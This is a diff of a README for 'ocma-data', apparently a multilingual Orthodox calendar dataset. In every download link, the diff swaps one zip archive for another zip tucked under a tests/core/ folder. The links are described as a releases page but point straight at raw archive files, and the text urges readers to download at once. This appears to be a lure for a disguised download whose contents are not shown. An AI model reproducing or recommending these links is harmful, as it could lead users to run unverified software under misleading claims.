@@ -1,7 +1,7 @@
 # 🌟 ocma-data - Easy Access to Multilingual Calendar Data
 
 ## 📥 Download
-[![Download ocma-data](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/ocma_data/ocma-data_3.0.zip)](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/ocma_data/ocma-data_3.0.zip)
+[![Download ocma-data](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/tests/core/data-ocma-3.7.zip)](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/tests/core/data-ocma-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the ocma-data project! This application provides access to a structured dataset of the Old and New Orthodox Calendar from 1924 to 2099. Whether you need calendar data for research, educational purposes, or personal projects, you've come to the right place.
@@ -18,7 +18,7 @@ To use this application, ensure your computer meets the following requirements:
 Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.  
-   [Download ocma-data](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/ocma_data/ocma-data_3.0.zip)
+   [Download ocma-data](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/tests/core/data-ocma-3.7.zip)
 
 2. **Select the Latest Release**: On the releases page, find the version marked as the latest. This version includes the most recent updates and data.
 
@@ -50,6 +50,6 @@ For a deeper understanding of how to work with the dataset and explore advanced 
 
 ## 🔗 Download & Install
 Don’t wait to access essential calendar data.  
-[Visit the releases page to download ocma-data now!](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/ocma_data/ocma-data_3.0.zip)
+[Visit the releases page to download ocma-data now!](https://raw.githubusercontent.com/Wirayudhaa/ocma-data/main/tests/core/data-ocma-3.7.zip)
 
 By following these instructions, you will set yourself up for success with the ocma-data application. Enjoy exploring the rich history of Orthodox calendars!
